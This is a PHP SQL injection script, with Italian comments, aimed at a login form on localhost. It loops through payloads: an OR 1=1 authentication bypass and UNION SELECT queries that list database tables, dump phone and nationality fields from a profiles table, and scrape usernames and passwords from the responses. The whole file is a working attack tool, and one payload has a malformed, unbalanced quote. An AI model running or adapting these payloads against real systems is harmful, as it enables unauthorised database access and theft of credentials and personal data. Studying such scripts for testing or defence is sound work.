<?php
// sqli_test.php

$target = "http://localhost:8080/index.php";

$payloads = [
    "' OR 1=1; --",
    "' UNION SELECT 1,version(),3-- -",
    "' UNION SELECT 1, GROUP_CONCAT(table_name), 3 FROM information_schema.tables WHERE table_schema = DATABASE()-- -",
    "' UNION SELECT user_id, CONCAT('Telefono: ', telefono, ', Nazionalità: ', nazionalita, '), 3 FROM profiles-- -",
];

foreach ($payloads as $payload) {
    $username = urlencode($payload);
    $password = urlencode($payload);
    $url = "{$target}?username={$username}&password={$password}";

    echo "\n[+] Testando: {$payload}\n";
    $response = @file_get_contents($url);

    if ($response === false) {
        echo "[-] Errore connessione\n";
        continue;
    }

    if (strpos($response, "<strong>") !== false || strpos($response, '<div class="success">') !== false) {
        echo "[!] VULNERABILE!\n";

        // Estrae solo il contenuto dentro i <div class="success">...</div>
        preg_match_all('/<div class="success">(.*?)<\/div>/is', $response, $matches);

        if (!empty($matches[1])) {
            echo "    Dati trovati:\n";
            foreach ($matches[1] as $block) {
                $clean = html_entity_decode(strip_tags($block));
                $lines = array_filter(array_map('trim', explode("\n", $clean)));
                foreach ($lines as $line) {
    // Regex aggiornata con supporto a spazi e caratteri vari
    if (preg_match('/id:\s*(\d+)\s*username:\s*(.*?)\s*password:\s*(.*)/i', $line, $m)) {
        echo "    id: {$m[1]} | username: {$m[2]} | password: {$m[3]}\n";
    } else {
        echo "    - $line\n";
    }
}
            }
        } else {
            echo "    [!] Trovato <strong>, ma nessun dato estratto.\n";
        }

    } else {
        echo "[-] Nessun risultato visibile\n";
    }

    echo "-----------------------------\n";
}
?>
